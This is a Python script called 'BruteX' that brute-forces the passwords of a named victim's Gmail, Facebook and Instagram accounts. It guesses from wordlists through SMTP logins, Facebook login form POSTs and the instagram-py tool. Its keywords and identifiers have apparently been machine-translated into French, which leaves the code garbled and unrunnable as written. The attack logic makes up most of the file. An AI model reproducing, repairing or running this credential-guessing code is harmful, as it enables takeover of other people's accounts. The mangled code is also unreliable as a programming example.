# /bin/python !
# https://github.com/MrHacker-X/

de  __future__  import   absolu_import
de  __future__  importateur   print_function
 temps  d' importation _
importateur  le  système d' exploitation _  _   _
importateur   le  fil
importateur   syst è me
 demandes  d' importation _
  depuis bs4 importer   BeautifulSoup  
importateur   smtplib
à partir  de  l' heure d'   importation   du  sommeil

passeur   = ( '''
\033 [1 91 m[ \033 [1 97 m ? \033 [1;91m] \033 [1;92mSélectionnez le type de mot de passe :
\033 [1;91m[ \033 [1;97m1 \033 [1;91m] \033 [1;92m Par défaut
\033 [1;91m[ \033 [1;97m2 \033 [1;91m] \033 [1;92m
\033 [1;91m[ \033 [1;97m3 \033 [1;91m] \033 [1;92m Retour
\033 [1;91m[ \033 [1;97m0 \033 [1;91m] \033 [1;92m Abandon
\033 [1;91mbrutex \033 [1;97m>> \033 [1;92m ''' )

menu_principal   = ( '''
\033 [1 91 m[ \033 [1 97 m ? \033 [1;91m] \033 [1;92m Sélectionnez une option :
\033 [1;91m[ \033 [1;97m1 \033 [1;91m] \033 [1;92m
\033 [1;91m[ \033 [1;97m2 \033 [1;91m] \033 [1;92m Facebook
\033 [1;91m[ \033 [1;97m3 \033 [1;91m] \033 [1;92m Courriel
\033 [1;91m[ \033 [1;97m4 \033 [1;91m] \033 [1;92m Environ
\033 [1 91 m[ \033 [1 97 m5 \033 [1 91 m] \033 [1 92 m Connectez-vous avec les États-Unis
\033 [1;91m[ \033 [1;97m0 \033 [1;91m] \033 [1;92m Abandon
\033 [1;91mbrutex \033 [1;97m>> \033 [1;92m ''' )

banr   = ( """ \033 [1;92m ___ __ _ __
  / _ )______ __/ /____ | |/_/
/ _ / __/ // / __/ -_)> <  
/____/_/ \_,_/\__/\__//_/|_|  
\033 [1;91m<═══ \033 [1;41m \033 [1;97m Créé par MrHacker-X \033 [;0m \033 [1;91m═══> \033 [1;92m"" " )
about = ( """ \0 33 [ 1 ; 91 m [ \0 33 [ 1 ; 97 m ? \ 033 [ 1 ; 91 m ] \0 33 [ 1 ; 92 mForce Brute  Introduction :
\0 33 [ 1 ; 97 m ➤ \ 033 [ 1 ; 92 mUne  attaque  par  force  brute  est  une  attaque  cryptanalytique  qui  peut , en  th é orie , ê tre  utilis é e  pour  tenter  de  d é chiffrer  n 'importe quelle donnée chiffrée (à l' exception  des  donn é es  chiffr é es  d'une manière théoriquement sécurisée). [1] Une telle attaque peut être utilisée lorsqu'il n'est  pas possible de tirer parti d' autres  faiblesses  d' un système de chiffrement ( s'il  en  existe ) qui  faciliteraient  la  tâche .
Lors  de  la  recherche  de  mots  de  passe , cette  méthode est très rapide lorsqu'elle  est utilisée pour vérifier tous les mots de passe courts, mais pour les mots de passe plus longs , d' autres méthodes telles que l ' attaque par dictionnaire sont utilisés es car une recherche par force brute prend trop de temps _                     . Les  mots  de  passe , les  phrases  de  passe  et  les  clés plus longs ont plus de valeurs possibles , ce qui les rend exponentiellement plus difficiles à dé chiffrer que les plus courts . [ 2 ] _  _                
Les  attaques  par  force  brute peuvent être  rendues moins efficaces en obscurcissant les donn é es à encoder , ce qui rend plus difficile pour un attaquant de reconna î tre quand le code a é t é craqu é ou en obligeant l' attaquant à faire plus de travail pour tester chaque supposition. L'                       [  3  ]  _  _  _  _ _ _  _  _ _ _ _ _  _  _  _  _  _  _  _  _  _ _ _  _  _ _ _ _
Les  attaques  par  force  brute  sont  une  application  de  la  recherche  par  force  brute , la  technique  générale de résolution de problèmes consistant à é num é rer tous les candidats et à vérifier chacun d ' eux . _  _ _ _ _ _ _ _ _          
\0 33 [ 1  91  m [ \0 33 [ 1  97  m ? \ 033 [ 1 ; 91 m ] \0 33 [ 1 ; 92 m  Caracté ristiques  de  BruteX : _
\0 33 [ 1 ; 97 m ➤ \ 033 [ 1 ; 92 mVous pouvez  attaquer  brutalement  l'  Instagram , Facebook et l' identifiant  de  messagerie  de  votre  victime  avec  100  mots  de  passe / seconde , vous  pouvez  ajouter  votre  propre  liste  de  mots  de  passe  personnels é e  et  cet  outil a é galement  une  liste  de  mots  de  passe , donc  si  vous  ne  Vous  n'avez pas votre propre liste de mots de passe, alors ça va, ne vous inquiétez pas, vous pouvez utiliser la fonction d' attaque  automatique ( dans  cette  fonction , vous  n'avez pas besoin  de votre propre liste de mots de passe ) . _         
\0 33 [ 1  91  m [ \0 33 [ 1  97  m ? \ 033 [ 1 ; 91 m ] \0 33 [ 1 ; 92 m  Auteur :
\0 33 [ 1 ; 97 m ➤ \ 033 [ 1 ; 92 mTool  BruteX  est  créé par MrHacker - X _ 
\0 33 [ 1 ; 92 mètres """ )
soc = """ \0 33 [ 1 ; 91 m [ \0 33 [; 1 ; 97 m01 \0 33 [ 1 ; 91 m ] \0 33 [ 1 ; 92 mS é lectionnez  les  options
\0 33 [ 1 ; 91 m [ \0 33 [; 1 ; 97 m01 \0 33 [ 1 ; 91 m ] \0 33 [ 1 ; 92 mInstagram
\0 33 [ 1 ; 91 m [ \0 33 [; 1 ; 97 m02 \0 33 [ 1 ; 91 m ] \0 33 [ 1 ; 92 mFacebook
\0 33 [ 1 ; 91 m [ \0 33 [; 1 ; 97 m03 \0 33 [ 1 ; 91 m ] \0 33 [ 1 ; 92 mGithub
\0 33 [ 1 ; 91 m [ \0 33 [; 1 ; 97 m04 \0 33 [ 1 ; 91 m ] \0 33 [ 1 ; 92 mYouTube
\0 33 [ 1 ; 91 m [ \0 33 [; 1 ; 97 m05 \0 33 [ 1 ; 91 m ] \0 33 [ 1 ; 92 mTélégramme _ _ _ _
\0 33 [ 1 ; 91 m [ \0 33 [; 1 ; 97 m99 \0 33 [ 1 ; 91 m ] \0 33 [ 1 ; 92 mRetour
\0 33 [ 1 ; 91 m [ 00 ] \0 33 [ 1 ; 91 mQuitter
\0 33 [ 1  97  m [ \0 33 [ 1  91  m ?? \ 033 [ 1 ; 97 m ] \0 33 [ 1 ; 91 mbrutex >> \0 33 [ 1 ; 92 mètres """
définitivement par défaut ():
	classeur GmailBruteForce() :
	    définitivement __init__ ( soi ):
	        soi .comptes = []
	        soi .mots de passe = []
	        donc je . init_smtplib ()
	
	    def get_pass_list ( soi , chemin ):
	        file = open ( path , 'r' , encoding = 'utf8' ). lire ().lignes de séparation ()
	        pour ligne d'entrée le fichier :
	            donc je . mots de passe . ajouter (ligne)
	
	    def init_smtplib ( soi ):
	        donc je . smtp = smtplib . SMTP ( "smtp.gmail.com" , 587 )
	        donc je . smtp. débuts ()
	        donc je . smtp. ehlo ()
	    
	    def try_gmail ( self ):
	
	        pour l'utilisateur en soi .comptes :
	            pour le mot de passe en soi .mots de passe :
	                essayer :
	                    donc je . smtp. login (utilisateur, mot de passe)
	                    print (( " \033 [1;37mbon -> %s " % utilisateur + " -> %s \033 [1;m" % mot de passe ))
	                    donc je . smtp. lâcheur ()
	                    donc je . init_smtplib ()
	                    Pause ;
	                sauf smtplib . Erreur d'authentification SMTP :
	
	                    print (( " \033 [1;31msorry %s " % user + " -> %s \033 [1;m" % password ))
	
	instance = GmailForceBrute ()
	
	headers = [( 'User-agent' , 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' )]
	
	exemple. compte . ajouter ( usr )
	exemple. get_pass_list ( liste de passage )
	
	exemple. try_gmail ()
hackbook def ():
	si système. info_version [ 0 ] != 3 :
		. sortie ()
	
	post_url = 'https://www.facebook.com/login.php'
	en tête = {
		'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, comme Gecko) Chrome/65.0.3325.181 Safari/537.36' ,
	}
	charge utile = {}
	cookie = {}
	
	def create_form ():
		formulaire = dict ()
		cookie = { 'fr' : '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy' }
	
		données = requêtes . obtenir ( post_url , en-têtes = en-têtes )
		pour moi dans les données . des biscuits :
			biscuit [ je . nom ] = je . évaluer
		data = BeautifulSoup ( data . text , 'html.parser' ). formulaire
		si les données . entrée [ 'nom' ] == 'lsd' :
			forme [ 'lsd' ] = données . entrée [ 'valeur' ​​​​]
		retour (formulaire, cookie)
	
	 fonction def ( email , passw , i ):
		 charge utile globale , cookie
		si je % 10 == 1 :
			charge utile , cookie = create_form ()
			charge utile [ 'e-mail' ] = e-mail
		charge utile [ 'pass' ] = passw
		r = requêtes . post ( post_url , données=charge utile , cookies=cookie , en-têtes=en-têtes )
		si 'Rechercher des amis' dans r . texte ou 'code de sécurité' dans r . texte ou 'authentification à deux facteurs' dans r . texte :
			ouvert ( 'temp' , 'w' ). écrire ( str ( r . contenu ))
			print ( ' \n mot de passe est : ' , passw )
			retourner Vrai
		Retourner Faux
	
	fichier = ouvrir ( liste de passage , 'r' )
	
	print( " \n ID ciblé :" , usr )
	print ( " \033 [1;91m[ \033 [1;97m* \033 [1;91m] \033 [1;92mTrying Passwords from password ..." , ' \033 [1;91m' , ' \n ' )
	
	je = 0
	 fichier tandis que :
		mot de passe = fichier . ligne de lecture (). bande ()
		je += 1
		si len ( passw ) < 6 :
			Continuez
		print ( str ( i ) + " : " , passw )
		si fonction ( usr , passw , je ):
			Pause
# début du script principal
os. système ( "xdg-open https://youtube.com/@Technolex" )
temps. dormir ( 5 )
tandis que Vrai :
	os. système ( 'effacer' )
	impression ( banr )
	menu = entrée ( menu_principal )
	si menu == '01' ou menu == '1' :
		print ( ' \n  \033 [1;91m[ \033 [1;97m# \033 [1;91m] \033 [1;92m Exécuter tor dans une autre session de termux' )
		dormir ( 1 )
		tandis que Vrai :
			usr = input ( ' \n  \033 [1;91m[ \033 [1;97m? \033 [1;91m] \033 [1;92m Nom d'utilisateur cible : \033 [1;97m ' )
			si usr == '' :
				print ( ' \n  \033 [1;91m[ \033 [1;97m! \033 [1;91m] \033 [1;92m Aucun nom d'utilisateur détecté \n ' )
			sinon :
				Pause
			
		tandis que Vrai :
			pas = entrée
			si pas == '01' ou pas == '1' :
				imprimer ()
				os. système ( "instagram-py --username " + usr + " --password-list .pass.txt" )
				saisie (" \033 [1;94mAppuyez sur ENTER pour continuer" )
				Pause
			elif pas == '02' ou pas == '2' :
				imprimer ()
				passeliste = entrée ( ' \033 [1;91m[ \033 [1;97m? \033 [1;91m] \033 [1;92m Chemin de la liste de mots de passe : \033 [1;97m' ]
				os. système (" instagram-py --username " + usr + " --password-list " + liste de passe )
				entrée ( " \033 [1;94mAppuyez sur ENTER pour continuer" )
				Pause
			elif pas == '3' ou pas == '03' :
				Pause
			elif pas == '0' ou pas == '00' :
				sortie ()
				
	elif menu == '02' ou menu == '2' :
		tandis que Vrai :
			usr = entrée ( ' \n  \033 [1;91m[ \033 [1;97m? \033 [1;91m] \033 [1;92m ID utilisateur cible : \033 [1;97m ' )
			si usr == '' :
				print ( ' \n  \033 [1;91m[ \033 [1;97m! \033 [1;91m] \033 [1;92m ID utilisateur non détecté' )
			sinon :
				Pause
		tandis que Vrai :
			pas = entrée
			si pas == '' :
				print ( ' \n  \033 [1;91m[ \033 [1;97m! \033 [1;91m] \033 [1;92m Aucune entrée détectée' )
			elif pas == '01' ou pas == '1' :
				imprimer ()
				passlist = '.pass.txt'
				Pause
			elif pas == '02' ou pas == '2' :
				imprimer ()
				passeliste = entrée ( ' \033 [1;91m[ \033 [1;97m? \033 [1;91m] \033 [1;92m Chemin de la liste de mots de passe : \033 [1;97m ' )
				if passlist == '' :
					imprime ( ' \n  \033 [1;91m[ \033 [1;97m! \033 [1;91m] \033 [1;92m Aucune entrée détectée' )
				sinon :
					Pause
			elif pas == '03' ou pas == '3' :
				imprimer ()
				Pause
			elif pas == '0' ou pas == '00' :
				imprimer ()
				sortie ()
			sinon :
				print ( ' \n  \033 [1;91m[ \033 [1;97m! \033 [1;91m] \033 [1;92m Entrée invalide' )
		hackbook ()
		entrée ( " \033 [1;94mAppuyez sur ENTER pour continuer" )
		
	elif menu == '03' ou menu == '3' :
		tandis que Vrai :
			usr = input(' \n \033 [1;91m[ \033 [1;97m? \033 [1;91m] \033 [1;92m ID de l'e-mail cible : \033 [1;97m ')
			si usr == '' :
				print(' \n \033 [1;91m[ \033 [1;97m! \033 [1;91m] \033 [1;92m ID e-mail non détecté')
			autre:
				Pause
		tandis que Vrai :
			pas = entrée (passe)
			si pas == '' :
				print(' \n \033 [1;91m[ \033 [1;97m! \033 [1;91m] \033 [1;92m Aucune entrée détectée \n ')
			elif pas == '01' ou pas == '1' :
				imprimer ()
				passlist = '.pass.txt'
				Pause
			elif pas == '02' ou pas == '2' :
				imprimer ()
				passeliste = entrée ( ' \033 [1;91m[ \033 [1;97m? \033 [1;91m] \033 [1;92m Chemin de la liste de mots de passe : \033 [1;97m ' )
				if passlist == '' :
					print ( ' \n  \033 [1;91m[ \033 [1;97m! \033 [1;91m] \033 [1;92m Aucune entrée détectée' )
				sinon :
					Pause
			elif pas == '03' ou pas == '3' :
				imprimer ()
				Pause
			elif pas == '0' ou pas == '00' :
				imprimer ()
				sortie ()
			sinon :
				print ( ' \n  \033 [1;91m[ \033 [1;97m! \033 [1;91m] \033 [1;92m Entrée invalide' )
		pirater la messagerie ()
		entrée ( " \033 [1;94mAppuyez sur ENTER pour continuer" )
	elif menu == '4' ou menu == '04' :
		imprimer ()
		imprimer (environ)
		tandis que Vrai :
			a = entrée ( ' \n  \033 [1;91m[ \033 [1;97m? \033 [1;91m] \033 [1;92m Voulez-vous aller dans le menu principal \033 [1;91m[ \ 033 [1;97my/n \033 [1;91m] \033 [1;92m: \033 [1;97m ' )
			si une == 'y' ou une == 'Y' :
				Pause
			elif a == 'n' ou a == 'N' :
				sortie ()
			elif a == '' :
				print ( ' \n  \033 [1;91m[ \033 [1;97m! \033 [1;91m] \033 [1;92m Aucune entrée détectée' )
				dormir ( 1 )
			sinon :
				print ( ' \n  \033 [1;91m[ \033 [1;97m! \033 [1;91m] \033 [1;92m Entrée invalide' )
				dormir ( 1 )
	elif menu == '5' ou menu == '05' :
		os. système (" clair " )
		impression ( banr )
		imprimer ()
		imprimer ( " \033 [1;91m[ \033 [;1;97m~ \033 [1;91m] \033 [1;92mMerci d'avoir utilisé mon outil 'BruteX'. Vous pouvez me suivre sur divers sites de médias sociaux. Lien et les options sont données ci-dessous, alors sélectionnez ici les options où vous voulez me suivre " )
		imprimer ()
		imprimer ()
		tandis que Vrai :
			fol = entrée (soc)
			si fol == '1' ou fol == '01' :
				imprimer ()
				print ( " \033 [1;91m[*] \033 [1;97mOuverture de mon profil Instagram sur votre appareil \n " )
				temps.sommeil(1)
				os.system("xdg-open https://instagram.com/0hacker_x0")
            
			elif fol == '2' ou fol == '02' :
				imprimer()
				print("\033[1;91m[*] \033 [1;97mOuverture de ma page Facebook sur votre appareil \n ")
				temps.sommeil(1)
				os.system("xdg-open https://facebook.com/hackerxmr")
			elif fol == '3' ou fol == '03' :
				imprimer()
				print("\033[1;91m[*] \033 [1;97mOuverture de mon profil Github sur votre appareil \n ")
				temps.sommeil(1)
				os.system("xdg-open https://github.com/MrHacker-X")
			elif fol == '4' ou fol == '04' :
				imprimer()
				print("\033[1;91m[*] \033 [1;97mOuverture de ma chaîne YouTube sur votre appareil \n ")
				temps.sommeil(1)
				os.system("xdg-open https://youtube.com/@Technolex")
            
			elif fol == '5' ou fol == '05' :
				imprimer()
				print("\033[1;91m[*] \033 [1;97mOuverture de ma chaîne Telegram sur votre appareil \n ")
				temps.sommeil(1)
				os.system("xdg-open https://t.me/hackwithalex")
			elif fol == '9' ou fol == '99' :
				imprimer()
				print("\033[1;91m[*] \033 [1;92m Retour ... \n ")
				temps.sommeil(1)
				Pause
			elif fol == '0' ou fol == '00' :
				imprimer()
				sortir()
			elif fol == '':
				imprimer()
				print('Aucune entrée détectée')
				imprimer()
			autre:
				imprimer()
				print("\033[1;91mEntrée invalide")
				imprimer()
	elif menu == '00' ou menu == '0' :
		imprimer()
		sortir()
	menu elif == '':
		print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
		sleep(1)
	else:
		print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
		
